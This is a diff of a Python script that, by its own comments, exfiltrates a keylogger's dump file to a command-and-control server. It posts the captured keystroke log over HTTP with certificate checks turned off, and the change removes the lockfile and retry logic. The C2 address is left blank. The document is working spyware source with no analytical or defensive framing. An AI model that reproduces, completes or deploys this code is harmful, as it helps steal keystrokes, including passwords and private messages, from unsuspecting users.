@@ -9,28 +9,13 @@ logfile = ''
 ##Keylog dumpfile
 c2_url = ''
 ##C2 to listen for the dump files
-blocked = False
-##Lockfiles are set for sessions persistent configs
-WINDOWS_LOCKFILE =
-LINUX_LOCKFILE = 
 
 if __name__ == "__main__":
 	##OS Name code indicates correct path of dumpfile
 	if(os.name == 'nt'):
 		logpath = pathlib.WindowsPath(logfile)
-		if(os.path.exists(WINDOWS_LOCKFILE) == True):
-			blocked = True
 	if(os.name == 'posix'):
 		logpath = pathlib.PosixPath(logfile)
-		if(os.path.exists(LINUX_LOCKFILE) == True):
-			blocked = True
-	##check if enpoint is live after last connection failed
-	if(blocked == True):
-		checked = requests.request('HEAD',
-					   c2_url,
-					  verify=False)
-		if(checked.status_code == 200):
-			blocked = False
 	if(logpath.is_file() == False):
 		sys.exit()
 	##Creates Headers for endpoint identification
@@ -58,9 +43,6 @@ if __name__ == "__main__":
 							files={'bbe02f946d5455d74616fc9777557c22':open(logfile, 'r')},
 						        verify=False)
 		except requests.exceptions.ConnectTimeout:
-			if(os.name == 'nt'):
-				Path(WINDOWS_LOCKFILE).touch
-			elif(os.name == 'posix'):
-				Path(LINUX_LOCKFILE).touch
+			sys.exit() ##Need Recommended Action for Connect Timeout
 		finally:
 			sys.exit()
